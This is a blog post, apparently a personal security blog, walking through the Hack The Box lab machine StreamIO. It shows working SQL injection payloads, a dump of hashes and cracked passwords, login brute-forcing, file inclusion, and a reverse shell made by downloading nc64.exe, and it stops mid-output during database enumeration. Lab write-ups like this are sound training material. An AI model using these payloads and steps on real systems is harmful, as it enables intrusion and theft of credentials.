<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(HTB) - StreamIO" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Escalation cannot be done without basic AD enumeration" /><meta property="og:description" content="StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Escalation cannot be done without basic AD enumeration" /><link rel="canonical" href="https://an9k0r.github.io/posts/StreamIO/" /><meta property="og:url" content="https://an9k0r.github.io/posts/StreamIO/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-17T11:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(HTB) - StreamIO" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Escalation cannot be done without basic AD enumeration","headline":"(HTB) - StreamIO","dateModified":"2022-10-03T05:54:52+02:00","url":"https://an9k0r.github.io/posts/StreamIO/","datePublished":"2022-09-17T11:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/StreamIO/"},"@context":"https://schema.org"}</script><title>(HTB) - StreamIO | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(HTB) - StreamIO</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/28a57320ede69bb622f9eb9b93bd6b0b74d4dec5d0230d2ad581c256c886a79f.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(HTB) - StreamIO</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-17 11:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 17, 2022, 11:33 AM +0200" >Sep 17, 2022</em> </span> <span> Updated <em class="timeago" date="2022-10-03 05:54:52 +0200 " data-toggle="tooltip" data-placement="bottom" title="Mon, Oct 3, 2022, 5:54 AM +0200" >Oct 3, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1728 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p><strong>StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Escalation cannot be done without basic AD enumeration</strong></p><h1 id="enumeration">ENUMERATION</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s start NMAP:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>nmap -sC -sV -oN nmap 10.10.11.158 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 14:32 CEST
Nmap scan report for 10.10.11.158
Host is up (0.041s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-20 19:32:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-09-20T19:33:07+00:00; +7h00m00s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2022-09-20T19:32:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.38 seconds
</pre></table></code></div></div><p>So we have Kerberos, DNS, Webserver. According to Certificate information, we should add the DNS/SAN Names <code class="language-plaintext highlighter-rouge">10.10.11.158 streamio.htb watch.streamio.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><p>There is also LDAP running which always may prove useful for enumeration!</p><h2 id="webserver">Webserver<a href="#webserver" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Checking <code class="language-plaintext highlighter-rouge">streamio.htb</code> and <code class="language-plaintext highlighter-rouge">watch.streamio.htb</code> same default IIS page shows: <img data-src="/assets/images/4f5f52f42d695451284e39e4398ac8033eb76f722874afa45aaf44e565fa128c.png" alt="picture 2" data-proofer-ignore></p><p>I’ve started gobuster before checking SSL which is not a crime, it just won’t find anything ;). So let’s start gobuster</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre># didn't work because of self-signed cert.
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://watch.streamio.htb

# ffuf to the rescue.
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u https://watch.streamio.htb/FUZZ
</pre></table></code></div></div><p><img data-src="/assets/images/cf02aa4b4e0eb042cf2a3dc82b3c48d3be370432542d7dd4e159813e097eec0e.png" alt="picture 5" data-proofer-ignore></p><p>More pages were found <code class="language-plaintext highlighter-rouge">search.php</code>, <code class="language-plaintext highlighter-rouge">blocked.php</code>,…</p><p>Checking the <code class="language-plaintext highlighter-rouge">search.php</code> we get another page where user input is possible:</p><p><img data-src="/assets/images/094268fb9669a7d80d846d51f3cdc23b6d17c25b80263c1add5443bc155e72cb.png" alt="picture 6" data-proofer-ignore></p><p>Requests are sent in post so let’s check that in Burp:</p><p><img data-src="/assets/images/7a56dbf412a3c49e9da565b57b78ecc50d2327aaf61f3da576a6752ccbf7988f.png" alt="picture 7" data-proofer-ignore></p><p>Checking for SQLi it’s obvious that there is some blocking mechanismus behind it just by sending a query.</p><p><img data-src="/assets/images/7ef0738392a71c951e8894949b34d96d2215df9debd311ee9ec848e620c8c6e9.png" alt="picture 8" data-proofer-ignore></p><h1 id="exploitation">Exploitation</h1><h2 id="sql-injection">SQL Injection<a href="#sql-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>After trying for a bit, NULL appears to be causing problems however following pattern appears to be working:</p><p><img data-src="/assets/images/ad10b71104ed8a06420d591b984a2cfc296c7f297086c6936bc441240903d144.png" alt="picture 11" data-proofer-ignore></p><p>Lets try to read the database</p><p><img data-src="/assets/images/a8963fccc2bbf0c170c6870a97e80a962d4e9e7bb1a1acb6a920154251d8def0.png" alt="picture 12" data-proofer-ignore></p><p>Bingo!</p><h3 id="check-databases">Check Databases<a href="#check-databases" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>a' UNION SELECT 1,string_agg(name,' : '),3,4,5,6 FROM sys.databases --
</pre></table></code></div></div><p><img data-src="/assets/images/93d83cc2f25626e02cc7b7e28a2a6bb00e10863daea4a11020be4bae3da4995d.png" alt="picture 13" data-proofer-ignore></p><h3 id="getting-tables">Getting Tables<a href="#getting-tables" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/images/068b1fc00f0f17e92b95e663f0f303159ae2a116e1514fa837fda8e9d3f0d5e7.png" alt="picture 15" data-proofer-ignore></p><h3 id="getting-collumns">Getting Collumns<a href="#getting-collumns" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/images/b4c7ca34fb6e8fc18f227a866433e3a7e8ef183a25c0e907c6e87910bce04e18.png" alt="picture 16" data-proofer-ignore></p><p>There are few interesting fields there like obvious <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code></p><h3 id="dumping-usernames-and-password-hashes">Dumping Usernames and Password (hashes)<a href="#dumping-usernames-and-password-hashes" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>a' UNION SELECT 1,string_agg(CONCAT(username,' - ',password),'  :  '),3,4,5,6 FROM streamio..users --
</pre></table></code></div></div><p><img data-src="/assets/images/bf9f24b14fe581902155dca4feddd04c272c14ab5275e4fd4d60b1e79bb2415f.png" alt="picture 17" data-proofer-ignore></p><p>Throwing 665a50ac9eaa781e4f7f04199db97a11 md5 hash into <a href="https://md5decrypt.net/">md5decrypt</a> already provides us with the password which is <code class="language-plaintext highlighter-rouge">paddpadd</code> however let’s do this properly and try to see if we can decode other username:password combinations. Save that file and make a list of username:password</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>luka@MBP htb % cat streamio_users.txt | sed 's/ //g' | sed 's/\/r\/n/\n/g' 
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Robert:f03b910e2bd0313a23fdd7575f34a694
Thane:3577c47eb1e12c8ba021611e1280753c
Carmon:35394484d89fcfdb3c5e447fe749d213
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Gloria:0cfaaaafb559f081df2befbe66686de0
Victoria:b22abb47a02b52d5dfa27fb0b534f693
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Baxter:22ee218331afd081b0dcd8115284bae3
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Barbra:3961548825e3e21df5646cafe11c6c76
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Austin:0049ac57646627b8d7aeaccf8b6a936f
Garfield:8097cedd612cc37c29db152b6e9edbd3
Juliette:6dcd87740abb64edfa36d170f0d5450d
Victor:bf55e15b119860a6e6b5a164377da719
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Robin:dc332fb5576e9631c9dae83f194f8e70
Stan:384463526d288edcc95fc3701e523bc7
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
admin:665a50ac9eaa781e4f7f04199db97a11
</pre></table></code></div></div><p>Using hashcat it shouldn’t take more then few seconds:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat streamio.hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 0 --user
</pre></table></code></div></div><p>Which yields following results:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
</pre></table></code></div></div><h2 id="enumeration-v2---streamiohtb">Enumeration v.2 - streamio.htb<a href="#enumeration-v2---streamiohtb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now we’ve got few credentials, but no place to login.</p><p>I use Feroxbuster for recursive web director enumeration and it did undeed found some interesting directories:</p><p><img data-src="/assets/images/6a918b8117f4bdac2c226a967a1bd2f34cbe26b7af93c5d6a7777cc3d7fd974d.png" alt="picture 18" data-proofer-ignore></p><h2 id="bruteforce-streamiohtb-login">Bruteforce streamio.htb login<a href="#bruteforce-streamiohtb-login" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ll use intruder but first i had to split usernames and passwords</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(luka㉿yokai)-[~/htb/boxes/streamio]
└─$ cat hashes | awk -F":" '{print $1}' &gt; user.txt

┌──(luka㉿yokai)-[~/htb/boxes/streamio]
└─$ cat hashes | awk -F":" '{print $3}' &gt; pass.txt
</pre></table></code></div></div><p>And now capture the login request in burp and send it to intruder. We’ll use Pitchfork mode</p><p><img data-src="/assets/images/cd50b3e24cf8ab82d4250a7a404841843bf75fd99fff1efc2d9d509784964581.png" alt="picture 19" data-proofer-ignore></p><p>Load user and password as 2 different sets and start bruteforcing.</p><p>And last one - Yoshiside worked:</p><p><img data-src="/assets/images/9a017088086a76a3fad5b3683f9575b3d966179b6100c2b942ebe347ba9a0936.png" alt="picture 20" data-proofer-ignore></p><p>Login was succesful.</p><p><img data-src="/assets/images/f8cd2c3f699e621501388326438194ddf3e910b3ac524f19357db3b22674032c.png" alt="picture 21" data-proofer-ignore></p><p>Apparently from here we can move to the admin pages that were discovered using <code class="language-plaintext highlighter-rouge">feroxbuster</code>.</p><p><img data-src="/assets/images/48b84d8661522c129d3cf2093c8a0544bd605cd8cd73ddd2c2146dd39d1da074.png" alt="picture 22" data-proofer-ignore></p><h2 id="fuzzing-parameter-names">Fuzzing parameter names<a href="#fuzzing-parameter-names" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>After checking the source and noticing that parameters that are defined actually do nothing, i’ve decided to bruteforce parameters. <code class="language-plaintext highlighter-rouge">FFUF</code> was used for that</p><p><img data-src="/assets/images/0bda0198962ff02241ce0e288a5e9f7232f2ca135d63b7cae2c81fab71141232.png" alt="picture 23" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=ei0qb6n4l0bove7pcsapnc2sso" -u https://streamio.htb/admin/index.php?FUZZ=1 --fs 1678
</pre></table></code></div></div><p>And we can see another parameter <code class="language-plaintext highlighter-rouge">debug</code> that’s being used.</p><p><img data-src="/assets/images/4618652dbaaed14ff7d934cdaff407519f2c054ba8223b05d1ce23d61a94c403.png" alt="picture 24" data-proofer-ignore></p><p>And after trying the newly discoverd parameter we get another unpleasant message</p><p><img data-src="/assets/images/3597742f2746358f48d3c461fc4ad28614f629242c05ae62f9793dcc14c8db1d.png" alt="picture 25" data-proofer-ignore></p><h2 id="local-file-inclusion">Local File Inclusion<a href="#local-file-inclusion" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Apparently there is LFI present making it possible for us to read local files - remember: PHP files need to be encoded to prevent executing!</p><p><img data-src="/assets/images/2230d8dcddb82931b24bcd048f3a1777c8cc278d954ccf098b210f8959610577.png" alt="picture 26" data-proofer-ignore></p><p>Here’s the DB password:</p><p><img data-src="/assets/images/55d1777135ad2b519030de55c690ca019f70abb2a2da021185c4fba3a4d2f8ce.png" alt="picture 27" data-proofer-ignore></p><p>Password does not work elsewhere though.</p><p>Let’s try to read <code class="language-plaintext highlighter-rouge">master.php</code> which we also found and know it exists:</p><p><img data-src="/assets/images/d82eef8d80c72c498fdfea1e1708c1514142ab20a8b4ff84097b61e39ed9ae69.png" alt="picture 28" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">master.php</code> includes pages diferently and passes them to eval. This should execute page if we pass it remotly, so let’s try that. (Parameter’s name is <code class="language-plaintext highlighter-rouge">include</code>)</p><p>We cannot get to <code class="language-plaintext highlighter-rouge">master.php</code> directly but have to include it using <code class="language-plaintext highlighter-rouge">debug</code> parameter and use RFI through <code class="language-plaintext highlighter-rouge">include</code> parameter in a POST requeset</p><p><img data-src="/assets/images/96f7f557472cfe3e62de5166ea7613c52dacbd4489cf063e7d4077a52bc509fd.png" alt="picture 29" data-proofer-ignore></p><p>As we can see that system reaches for file on our server (on the screenshot i’ve forgot that we’re dealing with Windows here ;)), it should be possible to execute code on StreamIO machine.</p><p>I’ve tried to get reverse shell using powershell one-liner scripts etc. but nothing worked. I couldn’t figure why, so i resorted to plain netcat binary from here: https://github.com/int0x33/nc.exe/raw/master/nc64.exe.</p><p>As i’ve recently switched to MAC and i didn’t fully configure my old windows machine yet, with Visual Studio on it for fancy stuff i’ve sticked with Netcat ;).</p><p><img data-src="/assets/images/d7e1b5f4c0c39bfede0375b0d0f2b91bd4cfc2e3653b0724d252fb48e3f7af54.png" alt="picture 51" data-proofer-ignore></p><p>As it can be seen above, i’ve used helper php script which downloaded nc64.exe to StreamIO machine and started reverse shell.</p><p><img data-src="/assets/images/0c713070926469b43f412640850a21ec0cb08f4f008c1b2daf01052faab78060.png" alt="picture 52" data-proofer-ignore></p><p>We have a shell as <code class="language-plaintext highlighter-rouge">Yoshihide</code> which is normal medium integrity user.</p><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="db-enumeration-using-yoshihide">DB Enumeration using Yoshihide<a href="#db-enumeration-using-yoshihide" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’ve got username and password for Database before, so let’s check it</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>PS C:\inetpub\streamio.htb\admin&gt; sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "select name from sys.databases;"
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "select name from sys.databases;"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup
